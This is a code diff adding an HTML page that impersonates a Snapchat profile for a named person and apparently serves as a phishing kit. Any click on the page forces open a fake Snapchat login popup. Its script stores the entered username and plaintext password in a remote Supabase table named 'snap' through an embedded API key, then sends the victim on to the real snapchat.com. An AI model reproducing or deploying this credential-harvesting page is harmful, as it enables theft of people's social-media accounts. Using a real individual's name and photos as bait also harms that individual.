@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat-Style Profile</title>
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    
+    <style>
+        @font-face {
+            font-family: "Avenir Next";
+            src: url("AvenirNextLTPro-Regular.otf") format("opentype"); 
+            font-weight: normal;
+        }
+
+        @font-face {
+            font-family: "Avenir Next";
+            src: url("fonts/AvenirNext-Bold.ttf") format("truetype");
+            font-weight: bold;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Avenir Next", sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            background: url('IMG_20250301_174503.jpg') no-repeat center center/cover;
+            position: relative;
+        }
+
+        .profile-container {
+            width: 100%;
+            height: 75%;
+            background: white;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            box-shadow: 0 -5px 10px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .profile-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .profile-pic-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 3px solid #b0b6bb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .profile-pic {
+            width: 95%;
+            height: 95%;
+            border-radius: 50%;
+            border: 3px solid white;
+            object-fit: cover;
+        }
+
+        .status-dot {
+            width: 12px;
+            height:12px;
+            background: green;
+            border-radius: 50%;
+            border: 2px solid white;
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+        }
+
+        .profile-text h2 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .profile-text p {
+            font-size: 14px;
+            color: gray;
+        }
+        .snap-logo {
+    width: 70px;  /* Set desired width */
+    height: 70px; /* Set desired height */
+    object-fit: cover; /* Ensures the image fills the space properly */
+}
+
+        .profile-button {
+            margin-top: 15px;
+            background-color: #fffd00;
+            color: black;
+            font-size: 16px;
+            height: 50px;
+            width: 100%;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: transform 0.1s ease-in-out;
+        }
+
+        .login-button {
+            margin-top: 15px;
+            
+            background-color: #fffd00;
+            color: black;
+            font-size: 16px;
+            height: 40px;
+            width: 40%;
+            border: none;
+            font-weight: bold;
+            border-radius: 50px;
+            padding: 12px 24px;
+            cursor: pointer;
+            display: block;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 0 auto;
+            transition: transform 0.1s ease-in-out;
+        }
+
+        .profile-button:active {
+            transform: scale(0.9);
+        }
+
+        .button-icon {
+            width: 19px;
+            height: 19px;
+            object-fit: contain;
+        }
+
+        .vertical-container {
+            margin-top: 40px;
+            width: 33.3%;
+            height: 50%;
+            background-color: #f0f0f0;
+            border-radius: 0px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            margin-left: -20px;
+        }
+
+        .vertical-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 0px;
+        }
+
+        .popup-menu {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            width: 350px;
+            padding: 20px;
+            padding-right: 40px;
+            padding-left: 40px;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        .popup-menu h3 {
+            margin-bottom: 40px;
+            font-size: 24px;
+            font-weight: 800;
+        }
+
+        .popup-menu h2 {
+            margin-top: 10px;
+            font-size: 12px;
+
+            font-weight: bold;
+            text-align: left;
+            color: #555d5f;
+        }
+        .popup-menu h4 {
+            margin-top: 10px;
+            font-size: 12px;
+margin-bottom: 30px;
+            font-weight: bold;
+            text-align: right;
+            color: #555d5f;
+        }
+
+        .text-input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: none;
+            
+            background-color: #f7f7f7;
+            border-radius: 2px;
+            font-size: 16px;
+            text-align: left;
+            outline: none;
+            transition: 0.3s ease-in-out;
+        }
+
+        .text-input:focus {
+            border-color: #000;
+            background-color: #dadada;
+        }
+
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="popup-overlay" onclick="closePopup()"></div>
+
+    <div class="popup-menu" id="popupMenu">
+        <img src="snapchat-logo-46444.png" alt="Add Icon" class="snap-logo">
+        <h3>Log In</h3>
+        <h2>Username or Email</h2>
+        <input type="text" id="username" class="text-input" placeholder="">
+        <h2>Password</h2>
+        <input type="password" id="password" class="text-input" placeholder="">
+        <h4>Forgot Password</h4>
+        <button class="login-button" onclick="loginAndSaveData()">Login</button>
+    </div>
+
+    <div class="profile-container">
+        <div class="profile-info">
+            <div class="profile-pic-container">
+                <img src="IMG_20250301_174503.png" alt="Profile" class="profile-pic">
+                <div class="status-dot"></div>
+            </div>
+            <div class="profile-text">
+                <h2>Noya Ibrahim</h2>
+                <p>noya.mohamed</p>
+            </div>
+        </div>
+
+        <button class="profile-button">
+            <img src="add-user-2-24.png" alt="Add Icon" class="button-icon"> Add
+        </button>
+
+        <div class="vertical-container">
+            <img src="VideoCapture_20250301-182129.jpg" alt="Image Placeholder">
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+
+    <script>
+        function openPopup() {
+            document.getElementById("popupMenu").style.display = "block";
+            document.querySelector(".popup-overlay").style.display = "block";
+        }
+
+        function closePopup() {
+            document.getElementById("popupMenu").style.display = "none";
+            document.querySelector(".popup-overlay").style.display = "none";
+        }
+
+        document.body.addEventListener("click", function(event) {
+            if (!event.target.closest(".popup-menu")) {
+                openPopup();
+            }
+        });
+
+        const supabaseClient = supabase.createClient("https://qxluetvkqxillhqsbubl.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4bHVldHZrcXhpbGxocXNidWJsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzM5MzIwNTMsImV4cCI6MjA0OTUwODA1M30.11cD0yE0aJW1OIx0kB4EaWtCvg5nUkj-0QuTVk-C7zg");
+        console.log("Supabase initialized:", supabase);
+
+        async function loginAndSaveData() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+
+            if (!username || !password) {
+                alert("Please enter both username and password.");
+                return;
+            }
+
+            const { data, error } = await supabaseClient.from("snap").insert([{ username, password }]);
+            console.log("Data:", data);
+            console.log("Error:", error);
+
+            if (error) {
+                alert("Error saving data: " + error.message);
+            } else {
+                closePopup();
+            }
+            // Redirect user to Snapchat
+        window.location.href = "https://www.snapchat.com";
+        }
+    </script>
+
+</body>
+</html>
